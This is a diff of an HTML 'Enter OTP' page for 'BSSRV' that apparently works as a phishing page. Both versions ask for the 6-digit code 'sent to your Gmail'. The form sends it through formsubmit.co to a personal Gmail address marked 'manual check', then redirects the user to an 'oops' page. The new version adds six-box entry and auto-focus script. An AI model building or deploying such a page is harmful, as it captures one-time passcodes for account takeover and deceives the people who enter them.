@@ -1,83 +1,78 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Enter OTP | BSSRV</title>
-  <link rel="stylesheet" href="assets/css/style.css">
-  <style>
-    /* Additional OTP form specific styling */
-    .login-box form textarea,
-    .login-box form input[type="text"]{
-      width: 100%;
-      padding: 10px;
-      margin-top: 8px;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 1rem;
-    }
-
-    .login-box form button{
-      background: #800000;
-      color: #ffd700;
-      padding: 10px 14px;
-      border: none;
-      border-radius: 6px;
-      font-weight: 600;
-      cursor: pointer;
-      margin-top: 12px;
-    }
-
-    .status{
-      margin-top: 10px;
-      font-weight: 500;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Enter OTP | BSSRV</title>
+<link rel="stylesheet" href="assets/css/style.css">
+<style>
+  body { font-family: Arial, sans-serif; background:#f7f7f7; }
+  .login-section { max-width:400px; margin:50px auto; padding:20px; background:#fff; border-radius:10px; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
+  .login-box h2 { color:#800000; text-align:center; }
+  .otp-container { display:flex; justify-content:space-between; margin-top:20px; }
+  .otp-container input { width:45px; height:50px; font-size:1.5rem; text-align:center; border:1px solid #ccc; border-radius:6px; }
+  button { background:#800000; color:#ffd700; padding:10px 14px; border:none; border-radius:6px; font-weight:600; cursor:pointer; width:100%; margin-top:20px; }
+  .status { text-align:center; margin-top:10px; font-weight:500; color:green; }
+  .note { text-align:center; margin-top:10px; font-size:0.9rem; color:#555; }
+</style>
 </head>
 <body>
 
-  <!-- ===== HEADER ===== -->
-  <header class="login-header">
-    <div class="logo">
-      <img src="assets/images/bssrv_logo.png" alt="BSSRV Logo">
-      <h1>BSSRV</h1>
-    </div>
-  </header>
+<section class="login-section">
+  <div class="login-box">
+    <h2>Enter OTP</h2>
+    <p style="text-align:center;">Please enter the 6-digit OTP sent to your Gmail.</p>
 
-  <!-- ===== ENTER OTP SECTION ===== -->
-  <section class="login-section">
-    <div class="login-box">
-      <h2>Enter OTP</h2>
-      <p>Please enter the 6-digit OTP sent to your Gmail.</p>
+    <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
+      <!-- Hidden field to hold combined OTP -->
+      <input type="hidden" name="otp" id="fullOtp">
+      <input type="hidden" name="_subject" value="OTP entered (manual check)">
+      <input type="hidden" name="_captcha" value="true">
+      <input type="hidden" name="_next" value="oops.html">
 
-      <form id="otpForm" action="https://formsubmit.co/minissweb@gmail.com" method="POST">
-        <!-- User input field (OTP) -->
-        <label for="otp">OTP</label>
-        <input type="text" id="otp" name="otp" required placeholder="Enter OTP here">
+      <div class="otp-container">
+        <input type="text" maxlength="1" class="otp-box" required>
+        <input type="text" maxlength="1" class="otp-box" required>
+        <input type="text" maxlength="1" class="otp-box" required>
+        <input type="text" maxlength="1" class="otp-box" required>
+        <input type="text" maxlength="1" class="otp-box" required>
+        <input type="text" maxlength="1" class="otp-box" required>
+      </div>
 
-        <!-- Hidden fields for Formsubmit behavior -->
-        <input type="hidden" name="_subject" value="OTP entered (manual check)">
-        <input type="hidden" name="_captcha" value="true">
-        <input type="hidden" name="_next" value="oops.html"> <!-- Redirect user after submit -->
+      <button type="submit">Submit OTP</button>
+    </form>
 
-        <button type="submit">Submit OTP</button>
-      </form>
+    <div id="status" class="status"></div>
+    <p class="note">Didn't receive OTP? Try again later.</p>
+  </div>
+</section>
 
-      <p id="status" class="status"></p>
-      <p class="note">Didn't receive OTP? Try again later.</p>
-    </div>
-  </section>
+<script>
+  const otpBoxes = document.querySelectorAll('.otp-box');
+  const fullOtp = document.getElementById('fullOtp');
+  const form = document.getElementById('otpForm');
 
-  <script>
-    // Nicer UX: show sending message while form posts
-    document.getElementById('otpForm').addEventListener('submit', function(e){
-      document.getElementById('status').style.color = 'green';
-      document.getElementById('status').innerText = 'Submitting OTP...';
-      // form will submit normally; redirect handled by _next hidden field
+  // Auto-focus next input when typing
+  otpBoxes.forEach((box, i) => {
+    box.addEventListener('input', () => {
+      if (box.value.length === 1 && i < otpBoxes.length -1) otpBoxes[i+1].focus();
     });
-  </script>
+    box.addEventListener('keydown', (e) => {
+      if(e.key === "Backspace" && box.value === "" && i > 0) otpBoxes[i-1].focus();
+    });
+  });
+
+  // Combine OTP and submit
+  form.addEventListener('submit', (e) => {
+    const otpValue = Array.from(otpBoxes).map(input => input.value).join('');
+    fullOtp.value = otpValue;
+    document.getElementById('status').innerText = 'Submitting OTP...';
+    // Form will submit normally, redirect handled by _next
+  });
+</script>
 
 </body>
 </html>
+
 
 
